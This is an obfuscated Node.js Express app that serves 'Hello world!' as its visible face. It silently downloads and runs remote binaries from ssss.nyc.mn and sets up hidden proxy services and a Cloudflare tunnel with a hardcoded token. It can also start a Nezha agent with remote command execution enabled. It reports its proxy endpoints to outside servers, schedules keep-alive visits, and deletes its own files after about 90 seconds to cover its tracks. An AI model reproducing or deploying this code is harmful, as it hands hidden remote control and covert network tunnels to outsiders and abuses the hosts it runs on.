const _0x15b230=_0x1195;(function(_0x5a6e97,_0x1ab087){const _0x3c0da0=_0x1195,_0x2499bc=_0x5a6e97();while(!![]){try{const _0x435c75=parseInt(_0x3c0da0(0xf8))/0x1*(-parseInt(_0x3c0da0(0x11e))/0x2)+-parseInt(_0x3c0da0(0xde))/0x3+-parseInt(_0x3c0da0(0x156))/0x4*(parseInt(_0x3c0da0(0xb8))/0x5)+-parseInt(_0x3c0da0(0xe6))/0x6+-parseInt(_0x3c0da0(0x113))/0x7*(parseInt(_0x3c0da0(0xcb))/0x8)+parseInt(_0x3c0da0(0x14a))/0x9+parseInt(_0x3c0da0(0x101))/0xa;if(_0x435c75===_0x1ab087)break;else _0x2499bc['push'](_0x2499bc['shift']());}catch(_0xc1b087){_0x2499bc['push'](_0x2499bc['shift']());}}}(_0x4fab,0xe7545));const express=require(_0x15b230(0x11b)),app=express(),axios=require(_0x15b230(0xe8)),os=require('os'),fs=require('fs'),path=require(_0x15b230(0xd5)),{promisify}=require(_0x15b230(0x105)),exec=promisify(require(_0x15b230(0x144))['exec']),{execSync}=require(_0x15b230(0x144)),UPLOAD_URL=process[_0x15b230(0x125)][_0x15b230(0x140)]||'',PROJECT_URL=process[_0x15b230(0x125)][_0x15b230(0xe5)]||'',AUTO_ACCESS=process[_0x15b230(0x125)][_0x15b230(0x13f)]||![],FILE_PATH=process[_0x15b230(0x125)][_0x15b230(0xdf)]||_0x15b230(0x14c),SUB_PATH=process['env'][_0x15b230(0x117)]||_0x15b230(0x11f),PORT=process[_0x15b230(0x125)][_0x15b230(0x14f)]||process['env'][_0x15b230(0xda)]||0xbb8,UUID=process[_0x15b230(0x125)]['UUID']||_0x15b230(0xa7),NEZHA_SERVER=process[_0x15b230(0x125)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x15b230(0x125)][_0x15b230(0x13a)]||'',NEZHA_KEY=process['env'][_0x15b230(0xdc)]||'',ARGO_DOMAIN=process['env'][_0x15b230(0xac)]||_0x15b230(0xc3),ARGO_AUTH=process['env'][_0x15b230(0xaf)]||_0x15b230(0xc7),ARGO_PORT=process[_0x15b230(0x125)][_0x15b230(0xe3)]||0x1f41,CFIP=process[_0x15b230(0x125)]['CFIP']||_0x15b230(0x12d),CFPORT=process['env'][_0x15b230(0x10d)]||0x1bb,NAME=process[_0x15b230(0x125)][_0x15b230(0x146)]||'gogogo';!fs[_0x15b230(0xc1)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x15b230(0x160)](FILE_PATH+'\x20is\x20created')):console[_0x15b230(0x160)](FILE_PATH+_0x15b230(0xa3));function generateRandomName(){const _0x50a2c8=_0x15b230,_0x4bf578='abcdefghijklmnopqrstuvwxyz';let _0x84a199='';for(let _0x544ceb=0x0;_0x544ceb<0x6;_0x544ceb++){_0x84a199+=_0x4bf578[_0x50a2c8(0xbd)](Math[_0x50a2c8(0xb7)](Math[_0x50a2c8(0x12c)]()*_0x4bf578['length']));}return _0x84a199;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x15b230(0x110)](FILE_PATH,npmName),phpPath=path[_0x15b230(0x110)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x15b230(0x110)](FILE_PATH,botName),subPath=path[_0x15b230(0x110)](FILE_PATH,'sub.txt'),listPath=path[_0x15b230(0x110)](FILE_PATH,'list.txt'),bootLogPath=path[_0x15b230(0x110)](FILE_PATH,_0x15b230(0xc0)),configPath=path[_0x15b230(0x110)](FILE_PATH,'config.json');function deleteNodes(){const _0x4b48a9=_0x15b230;try{if(!UPLOAD_URL)return;if(!fs[_0x4b48a9(0xc1)](subPath))return;let _0x1b3fbe;try{_0x1b3fbe=fs[_0x4b48a9(0xad)](subPath,'utf-8');}catch{return null;}const _0x44f4a4=Buffer[_0x4b48a9(0xdd)](_0x1b3fbe,_0x4b48a9(0xe1))[_0x4b48a9(0xdb)](_0x4b48a9(0x123)),_0x365d79=_0x44f4a4[_0x4b48a9(0xbc)]('\x0a')[_0x4b48a9(0xa5)](_0x4fc119=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4b48a9(0x124)](_0x4fc119));if(_0x365d79[_0x4b48a9(0x151)]===0x0)return;return axios['post'](UPLOAD_URL+_0x4b48a9(0xfa),JSON[_0x4b48a9(0x112)]({'nodes':_0x365d79}),{'headers':{'Content-Type':_0x4b48a9(0xc5)}})[_0x4b48a9(0x12a)](_0x44fae0=>{return null;}),null;}catch(_0xd7cfdb){return null;}}function cleanupOldFiles(){const _0x14c04e=_0x15b230;try{const _0x19d42f=fs[_0x14c04e(0xe7)](FILE_PATH);_0x19d42f[_0x14c04e(0x157)](_0x81f9fc=>{const _0xd2df8d=_0x14c04e,_0x5c0f74=path[_0xd2df8d(0x110)](FILE_PATH,_0x81f9fc);try{const _0x10f7a9=fs[_0xd2df8d(0xf4)](_0x5c0f74);_0x10f7a9[_0xd2df8d(0xf0)]()&&fs[_0xd2df8d(0xab)](_0x5c0f74);}catch(_0x4c9272){}});}catch(_0x4f12fb){}}function _0x4fab(){const _0x54ca8a=['amd','map','App\x20is\x20running','config.yaml','pipe','rm\x20-rf\x20','vmess','https://ipapi.co/json/','all','NEZHA_PORT','Skipping\x20adding\x20automatic\x20access\x20task','Nodes\x20uploaded\x20successfully','push','\x20-c\x20\x22','AUTO_ACCESS','UPLOAD_URL','\x20-p\x20','https://oooo.serv00.net/add-url','writeFileSync','child_process','text/plain;\x20charset=utf-8','NAME','127.0.0.1','http://ip-api.com/json/','Error\x20reading\x20boot.log:','10473552wbRADy','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','./tmp','\x0a\x0avmess://','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','SERVER_PORT','ARGO_DOMAIN:','length','\x20>/dev/null\x202>&1\x20&','http','https://arm64.ssss.nyc.mn/v1','trojan','212DtEadS','forEach','set','post','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','block','data','platform','Error\x20executing\x20command:\x20','xtls-rprx-vision','log','message','TunnelSecret','error','/api/add-nodes','country_code','2096','https://amd64.ssss.nyc.mn/agent','listen','2087','finish','none','\x20already\x20exists','&path=%2Ftrojan-argo%3Fed%3D2560#','filter','Add\x20automatic\x20access\x20task\x20faild:\x20','57434D1A-9DCA-4378-8DC9-567037AA664A','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','match','success','unlinkSync','ARGO_DOMAIN','readFileSync','firefox','ARGO_AUTH','taskkill\x20/f\x20/im\x20','tls','arch','/trojan-argo','tunnel.yml','status','npm\x20running\x20error:\x20','floor','81610xfONyk','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','fileUrl','Error\x20in\x20startserver:','split','charAt','\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/v1','boot.log','existsSync','send','clawcloud.lives.qzz.io','NEZHA\x20variable\x20is\x20empty,skip\x20running','application/json','includes','eyJhIjoiNmNmZTAxMGMzOTNmNDA3MmFmOTk4ODM4NDIwMmM1YTciLCJ0IjoiYmY4MjUzOWItZGJkYS00NGY3LTg4OWMtNWI2MjEzYzdlMzc5IiwicyI6Ik1qQTVPRE13WkRVdFkyVTBZeTAwTnpNeUxUa3haR0V0WlRCbVpURTVZVEUzWVRobCJ9','arm64','web\x20running\x20error:\x20','tcp','97464OwcWTF','has','Hello\x20world!','basename','tunnel.json','php\x20running\x20error:\x20','config.json','--tls','arm','8443','path','https://amd64.ssss.nyc.mn/web','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Download\x20','\x20is\x20running','PORT','toString','NEZHA_KEY','from','2661453axRPSg','FILE_PATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','base64','mkdirSync','ARGO_PORT','https://arm64.ssss.nyc.mn/agent','PROJECT_URL','8576532maeWAm','readdirSync','axios','\x20failed:\x20','\x20-c\x20','close','Empowerment\x20failed\x20for\x20','vless','unshift','then','isFile','/sub.txt\x20saved\x20successfully','response','countryCode','statSync','\x0a\x20\x20tunnel:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','&fp=firefox&type=ws&host=','3TMavqM','stream','/api/delete-nodes','&path=%2Fvless-argo%3Fed%3D2560#','aarch64','Unknown','ArgoDomain:','https://arm64.ssss.nyc.mn/web','2083','35253590WBWVkq','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','443','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','util','\x0a\x0atrojan://','2053','.exe\x20>\x20nul\x202>&1','fileName','pop','/vmess-argo','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','CFPORT','\x0aclient_secret:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','join','win32','stringify','280wjXWqK','\x0a\x20\x20credentials-file:\x20','freedom','?security=tls&sni=','SUB_PATH','Content-Type','Unhandled\x20error\x20in\x20startserver:','direct','express','org','https://arm64.ssss.nyc.mn/bot','48402kmCcDq','sub','Error\x20downloading\x20files:','nohup\x20','quic','utf-8','test','env','/api/add-subscriptions','?encryption=none&security=tls&sni=','get','/vless-argo','catch','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','random','cdns.doon.eu.org','\x20>/dev/null\x202>&1','\x20-s\x20','blackhole'];_0x4fab=function(){return _0x54ca8a;};return _0x4fab();}app[_0x15b230(0x128)]('/',function(_0x5bc569,_0x343366){const _0x241c30=_0x15b230;_0x343366[_0x241c30(0xc2)](_0x241c30(0xcd));});async function generateConfig(){const _0x2b68b2=_0x15b230,_0x12729b={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x2b68b2(0xa2)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2b68b2(0xed),'settings':{'clients':[{'id':UUID,'flow':_0x2b68b2(0x15f)}],'decryption':_0x2b68b2(0xa2),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2b68b2(0x10b),'dest':0xbbb},{'path':_0x2b68b2(0xb3),'dest':0xbbc}]},'streamSettings':{'network':_0x2b68b2(0xca)}},{'port':0xbb9,'listen':_0x2b68b2(0x147),'protocol':_0x2b68b2(0xed),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2b68b2(0xca),'security':_0x2b68b2(0xa2)}},{'port':0xbba,'listen':_0x2b68b2(0x147),'protocol':_0x2b68b2(0xed),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2b68b2(0xa2)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2b68b2(0x129)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b68b2(0x153),'tls',_0x2b68b2(0x122)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2b68b2(0x137),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2b68b2(0xb1),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2b68b2(0x147),'protocol':_0x2b68b2(0x155),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2b68b2(0xb3)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2b68b2(0xb1),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x2b68b2(0x115),'tag':_0x2b68b2(0x11a)},{'protocol':_0x2b68b2(0x130),'tag':_0x2b68b2(0x15b)}]};fs[_0x2b68b2(0x143)](path['join'](FILE_PATH,_0x2b68b2(0xd1)),JSON[_0x2b68b2(0x112)](_0x12729b,null,0x2));}function getSystemArchitecture(){const _0x2cc9b2=_0x15b230,_0x2e2fbd=os[_0x2cc9b2(0xb2)]();return _0x2e2fbd===_0x2cc9b2(0xd3)||_0x2e2fbd===_0x2cc9b2(0xc8)||_0x2e2fbd===_0x2cc9b2(0xfc)?_0x2cc9b2(0xd3):_0x2cc9b2(0x131);}function downloadFile(_0x41ef96,_0x438dd8,_0x464339){const _0x1818bc=_0x15b230,_0x13ced3=_0x41ef96;!fs[_0x1818bc(0xc1)](FILE_PATH)&&fs[_0x1818bc(0xe2)](FILE_PATH,{'recursive':!![]});const _0xbe4c0=fs['createWriteStream'](_0x13ced3);axios({'method':_0x1818bc(0x128),'url':_0x438dd8,'responseType':_0x1818bc(0xf9)})[_0x1818bc(0xef)](_0x2e9f34=>{const _0x49d887=_0x1818bc;_0x2e9f34['data'][_0x49d887(0x135)](_0xbe4c0),_0xbe4c0['on'](_0x49d887(0xa1),()=>{const _0x320e89=_0x49d887;_0xbe4c0[_0x320e89(0xeb)](),console[_0x320e89(0x160)](_0x320e89(0xd8)+path[_0x320e89(0xce)](_0x13ced3)+'\x20successfully'),_0x464339(null,_0x13ced3);}),_0xbe4c0['on'](_0x49d887(0x163),_0x331c89=>{const _0x3add82=_0x49d887;fs['unlink'](_0x13ced3,()=>{});const _0x3cee6b=_0x3add82(0xd8)+path[_0x3add82(0xce)](_0x13ced3)+_0x3add82(0xe9)+_0x331c89[_0x3add82(0x161)];console[_0x3add82(0x163)](_0x3cee6b),_0x464339(_0x3cee6b);});})[_0x1818bc(0x12a)](_0x4abca5=>{const _0x5585dc=_0x1818bc,_0xf47193='Download\x20'+path[_0x5585dc(0xce)](_0x13ced3)+_0x5585dc(0xe9)+_0x4abca5['message'];console[_0x5585dc(0x163)](_0xf47193),_0x464339(_0xf47193);});}async function downloadFilesAndRun(){const _0x43b08b=_0x15b230,_0x22b304=getSystemArchitecture(),_0x13a7d2=getFilesForArchitecture(_0x22b304);if(_0x13a7d2[_0x43b08b(0x151)]===0x0){console[_0x43b08b(0x160)](_0x43b08b(0x10f));return;}const _0x28215e=_0x13a7d2[_0x43b08b(0x132)](_0x4eba12=>{return new Promise((_0x529df8,_0x55110b)=>{const _0x3c1155=_0x1195;downloadFile(_0x4eba12[_0x3c1155(0x109)],_0x4eba12[_0x3c1155(0xba)],(_0x271146,_0x10aa83)=>{_0x271146?_0x55110b(_0x271146):_0x529df8(_0x10aa83);});});});try{await Promise[_0x43b08b(0x139)](_0x28215e);}catch(_0x5b6c67){console[_0x43b08b(0x163)](_0x43b08b(0x120),_0x5b6c67);return;}function _0xb59564(_0x480c10){const _0x1a2619=_0x43b08b,_0xdb7153=0x1fd;_0x480c10[_0x1a2619(0x157)](_0x5a455b=>{fs['existsSync'](_0x5a455b)&&fs['chmod'](_0x5a455b,_0xdb7153,_0x5bc1d9=>{const _0x9b5412=_0x1195;_0x5bc1d9?console['error'](_0x9b5412(0xec)+_0x5a455b+':\x20'+_0x5bc1d9):console[_0x9b5412(0x160)]('Empowerment\x20success\x20for\x20'+_0x5a455b+':\x20'+_0xdb7153[_0x9b5412(0xdb)](0x8));});});}const _0x4a0a12=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xb59564(_0x4a0a12);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3f8e76=NEZHA_SERVER[_0x43b08b(0xc6)](':')?NEZHA_SERVER[_0x43b08b(0xbc)](':')[_0x43b08b(0x10a)]():'',_0x188d7d=new Set([_0x43b08b(0x103),_0x43b08b(0xd4),_0x43b08b(0x9d),'2087',_0x43b08b(0x100),'2053']),_0x20e66d=_0x188d7d[_0x43b08b(0xcc)](_0x3f8e76)?'true':'false',_0x209a7d=_0x43b08b(0x10e)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x43b08b(0xf6)+_0x20e66d+_0x43b08b(0xe0)+UUID;fs['writeFileSync'](path[_0x43b08b(0x110)](FILE_PATH,_0x43b08b(0x134)),_0x209a7d);const _0x439327=_0x43b08b(0x121)+phpPath+_0x43b08b(0x13e)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x439327),console[_0x43b08b(0x160)](phpName+_0x43b08b(0xd9)),await new Promise(_0x2daf4b=>setTimeout(_0x2daf4b,0x3e8));}catch(_0xfa12f8){console['error'](_0x43b08b(0xd0)+_0xfa12f8);}}else{let _0x52460f='';const _0x47e429=['443',_0x43b08b(0xd4),'2096',_0x43b08b(0xa0),'2083',_0x43b08b(0x107)];_0x47e429[_0x43b08b(0xc6)](NEZHA_PORT)&&(_0x52460f=_0x43b08b(0xd2));const _0x378a6d=_0x43b08b(0x121)+npmPath+_0x43b08b(0x12f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x43b08b(0x141)+NEZHA_KEY+'\x20'+_0x52460f+_0x43b08b(0x12b);try{await exec(_0x378a6d),console[_0x43b08b(0x160)](npmName+_0x43b08b(0xd9)),await new Promise(_0x320c94=>setTimeout(_0x320c94,0x3e8));}catch(_0x3e70c6){console[_0x43b08b(0x163)](_0x43b08b(0xb6)+_0x3e70c6);}}}else console[_0x43b08b(0x160)](_0x43b08b(0xc4));const _0x36a83a=_0x43b08b(0x121)+webPath+_0x43b08b(0xea)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x36a83a),console['log'](webName+_0x43b08b(0xd9)),await new Promise(_0x1d6789=>setTimeout(_0x1d6789,0x3e8));}catch(_0x160c46){console[_0x43b08b(0x163)](_0x43b08b(0xc9)+_0x160c46);}if(fs['existsSync'](botPath)){let _0x1235a7;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1235a7=_0x43b08b(0x14b)+ARGO_AUTH;else ARGO_AUTH[_0x43b08b(0xa9)](/TunnelSecret/)?_0x1235a7='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x1235a7=_0x43b08b(0x102)+FILE_PATH+_0x43b08b(0xd7)+ARGO_PORT;try{await exec(_0x43b08b(0x121)+botPath+'\x20'+_0x1235a7+_0x43b08b(0x152)),console[_0x43b08b(0x160)](botName+_0x43b08b(0xd9)),await new Promise(_0xce97f5=>setTimeout(_0xce97f5,0x7d0));}catch(_0x1ecb97){console[_0x43b08b(0x163)](_0x43b08b(0x15e)+_0x1ecb97);}}await new Promise(_0x45fcb3=>setTimeout(_0x45fcb3,0x1388));}function getFilesForArchitecture(_0x6ebf09){const _0x187630=_0x15b230;let _0x29cedd;_0x6ebf09===_0x187630(0xd3)?_0x29cedd=[{'fileName':webPath,'fileUrl':_0x187630(0xff)},{'fileName':botPath,'fileUrl':_0x187630(0x11d)}]:_0x29cedd=[{'fileName':webPath,'fileUrl':_0x187630(0xd6)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5c297a=_0x6ebf09===_0x187630(0xd3)?_0x187630(0xe4):_0x187630(0x9e);_0x29cedd[_0x187630(0xee)]({'fileName':npmPath,'fileUrl':_0x5c297a});}else{const _0x3faa49=_0x6ebf09==='arm'?_0x187630(0x154):_0x187630(0xbf);_0x29cedd[_0x187630(0xee)]({'fileName':phpPath,'fileUrl':_0x3faa49});}}return _0x29cedd;}function argoType(){const _0x45610c=_0x15b230;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x45610c(0x15a));return;}if(ARGO_AUTH[_0x45610c(0xc6)](_0x45610c(0x162))){fs[_0x45610c(0x143)](path[_0x45610c(0x110)](FILE_PATH,_0x45610c(0xcf)),ARGO_AUTH);const _0x2b2f14=_0x45610c(0xf5)+ARGO_AUTH['split']('\x22')[0xb]+_0x45610c(0x114)+path['join'](FILE_PATH,_0x45610c(0xcf))+_0x45610c(0xb9)+ARGO_DOMAIN+_0x45610c(0x104)+ARGO_PORT+_0x45610c(0xa8);fs[_0x45610c(0x143)](path[_0x45610c(0x110)](FILE_PATH,_0x45610c(0xb4)),_0x2b2f14);}else console[_0x45610c(0x160)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}function _0x1195(_0x2780d4,_0x34a650){_0x2780d4=_0x2780d4-0x9b;const _0x4fab25=_0x4fab();let _0x119540=_0x4fab25[_0x2780d4];return _0x119540;}async function extractDomains(){const _0x54bf81=_0x15b230;let _0x41f76c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x41f76c=ARGO_DOMAIN,console['log'](_0x54bf81(0x150),_0x41f76c),await _0x52c92a(_0x41f76c);else try{const _0x138005=fs[_0x54bf81(0xad)](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0xee9a1a=_0x138005[_0x54bf81(0xbc)]('\x0a'),_0x4a6b78=[];_0xee9a1a[_0x54bf81(0x157)](_0x4c448d=>{const _0xb49172=_0x54bf81,_0x5b322b=_0x4c448d[_0xb49172(0xa9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5b322b){const _0x3f7188=_0x5b322b[0x1];_0x4a6b78['push'](_0x3f7188);}});if(_0x4a6b78[_0x54bf81(0x151)]>0x0)_0x41f76c=_0x4a6b78[0x0],console[_0x54bf81(0x160)](_0x54bf81(0xfe),_0x41f76c),await _0x52c92a(_0x41f76c);else{console[_0x54bf81(0x160)](_0x54bf81(0x10c)),fs[_0x54bf81(0xab)](path[_0x54bf81(0x110)](FILE_PATH,_0x54bf81(0xc0)));async function _0x133931(){const _0x5cb499=_0x54bf81;try{process[_0x5cb499(0x15d)]===_0x5cb499(0x111)?await exec(_0x5cb499(0xb0)+botName+_0x5cb499(0x108)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x317d64){}}_0x133931(),await new Promise(_0x165ce9=>setTimeout(_0x165ce9,0xbb8));const _0x31e9d6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x31e9d6+_0x54bf81(0x152)),console['log'](botName+_0x54bf81(0xd9)),await new Promise(_0x13a532=>setTimeout(_0x13a532,0xbb8)),await extractDomains();}catch(_0x56ed11){console['error'](_0x54bf81(0x15e)+_0x56ed11);}}}catch(_0x3a9b01){console['error'](_0x54bf81(0x149),_0x3a9b01);}async function _0x3ea950(){const _0x35bb4d=_0x54bf81;try{const _0x19da93=await axios['get'](_0x35bb4d(0x138),{'timeout':0xbb8});if(_0x19da93[_0x35bb4d(0x15c)]&&_0x19da93[_0x35bb4d(0x15c)][_0x35bb4d(0x9c)]&&_0x19da93['data']['org'])return _0x19da93[_0x35bb4d(0x15c)]['country_code']+'_'+_0x19da93[_0x35bb4d(0x15c)][_0x35bb4d(0x11c)];}catch(_0x5dabed){try{const _0x354276=await axios[_0x35bb4d(0x128)](_0x35bb4d(0x148),{'timeout':0xbb8});if(_0x354276[_0x35bb4d(0x15c)]&&_0x354276[_0x35bb4d(0x15c)][_0x35bb4d(0xb5)]===_0x35bb4d(0xaa)&&_0x354276[_0x35bb4d(0x15c)][_0x35bb4d(0xf3)]&&_0x354276['data'][_0x35bb4d(0x11c)])return _0x354276[_0x35bb4d(0x15c)]['countryCode']+'_'+_0x354276[_0x35bb4d(0x15c)][_0x35bb4d(0x11c)];}catch(_0x36ddf0){}}return _0x35bb4d(0xfd);}async function _0x52c92a(_0x1dc0ab){const _0x6e0158=await _0x3ea950(),_0x7aa6d6=NAME?NAME+'-'+_0x6e0158:_0x6e0158;return new Promise(_0x184de2=>{setTimeout(()=>{const _0x1153ab=_0x1195,_0x6d35ba={'v':'2','ps':''+_0x7aa6d6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1153ab(0xa2),'net':'ws','type':_0x1153ab(0xa2),'host':_0x1dc0ab,'path':'/vmess-argo?ed=2560','tls':_0x1153ab(0xb1),'sni':_0x1dc0ab,'alpn':'','fp':_0x1153ab(0xae)},_0x1b89cb='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1153ab(0x127)+_0x1dc0ab+_0x1153ab(0xf7)+_0x1dc0ab+_0x1153ab(0xfb)+_0x7aa6d6+_0x1153ab(0x14d)+Buffer[_0x1153ab(0xdd)](JSON[_0x1153ab(0x112)](_0x6d35ba))[_0x1153ab(0xdb)]('base64')+_0x1153ab(0x106)+UUID+'@'+CFIP+':'+CFPORT+_0x1153ab(0x116)+_0x1dc0ab+_0x1153ab(0xf7)+_0x1dc0ab+_0x1153ab(0xa4)+_0x7aa6d6+'\x0a\x20\x20\x20\x20';console[_0x1153ab(0x160)](Buffer[_0x1153ab(0xdd)](_0x1b89cb)['toString']('base64')),fs['writeFileSync'](subPath,Buffer[_0x1153ab(0xdd)](_0x1b89cb)[_0x1153ab(0xdb)]('base64')),console['log'](FILE_PATH+_0x1153ab(0xf1)),uploadNodes(),app[_0x1153ab(0x128)]('/'+SUB_PATH,(_0x360d3b,_0x67dc1f)=>{const _0x4154d7=_0x1153ab,_0x4df579=Buffer[_0x4154d7(0xdd)](_0x1b89cb)[_0x4154d7(0xdb)]('base64');_0x67dc1f[_0x4154d7(0x158)](_0x4154d7(0x118),_0x4154d7(0x145)),_0x67dc1f[_0x4154d7(0xc2)](_0x4df579);}),_0x184de2(_0x1b89cb);},0x7d0);});}}async function uploadNodes(){const _0x1ba018=_0x15b230;if(UPLOAD_URL&&PROJECT_URL){const _0x5a5396=PROJECT_URL+'/'+SUB_PATH,_0x262ae6={'subscription':[_0x5a5396]};try{const _0x53f059=await axios[_0x1ba018(0x159)](UPLOAD_URL+_0x1ba018(0x126),_0x262ae6,{'headers':{'Content-Type':'application/json'}});return _0x53f059&&_0x53f059['status']===0xc8?(console[_0x1ba018(0x160)]('Subscription\x20uploaded\x20successfully'),_0x53f059):null;}catch(_0x4097d5){if(_0x4097d5[_0x1ba018(0xf2)]){if(_0x4097d5[_0x1ba018(0xf2)][_0x1ba018(0xb5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x8a2e36=fs[_0x1ba018(0xad)](listPath,_0x1ba018(0x123)),_0x3b895e=_0x8a2e36['split']('\x0a')['filter'](_0x315730=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1ba018(0x124)](_0x315730));if(_0x3b895e[_0x1ba018(0x151)]===0x0)return;const _0x41a1b5=JSON['stringify']({'nodes':_0x3b895e});try{const _0x2d58a1=await axios[_0x1ba018(0x159)](UPLOAD_URL+_0x1ba018(0x9b),_0x41a1b5,{'headers':{'Content-Type':_0x1ba018(0xc5)}});return _0x2d58a1&&_0x2d58a1[_0x1ba018(0xb5)]===0xc8?(console[_0x1ba018(0x160)](_0x1ba018(0x13c)),_0x2d58a1):null;}catch(_0xc1b40b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x29ffc0=_0x1195,_0x59258c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x59258c[_0x29ffc0(0x13d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x59258c['push'](phpPath);process[_0x29ffc0(0x15d)]===_0x29ffc0(0x111)?exec('del\x20/f\x20/q\x20'+_0x59258c[_0x29ffc0(0x110)]('\x20')+_0x29ffc0(0xbe),_0x1a00af=>{const _0x561bc6=_0x29ffc0;console['clear'](),console[_0x561bc6(0x160)]('App\x20is\x20running'),console[_0x561bc6(0x160)](_0x561bc6(0x14e));}):exec(_0x29ffc0(0x136)+_0x59258c[_0x29ffc0(0x110)]('\x20')+_0x29ffc0(0x12e),_0x27d527=>{const _0x32f022=_0x29ffc0;console['clear'](),console[_0x32f022(0x160)](_0x32f022(0x133)),console[_0x32f022(0x160)](_0x32f022(0x14e));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x285b42=_0x15b230;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x285b42(0x160)](_0x285b42(0x13b));return;}try{const _0x345c8e=await axios[_0x285b42(0x159)](_0x285b42(0x142),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x285b42(0xc5)}});return console[_0x285b42(0x160)]('automatic\x20access\x20task\x20added\x20successfully'),_0x345c8e;}catch(_0x18122d){return console[_0x285b42(0x163)](_0x285b42(0xa6)+_0x18122d[_0x285b42(0x161)]),null;}}async function startserver(){const _0x2fada5=_0x15b230;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x365fa7){console[_0x2fada5(0x163)](_0x2fada5(0xbb),_0x365fa7);}}startserver()['catch'](_0x2c8f62=>{const _0x5be5da=_0x15b230;console[_0x5be5da(0x163)](_0x5be5da(0x119),_0x2c8f62);}),app[_0x15b230(0x9f)](PORT,()=>console[_0x15b230(0x160)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
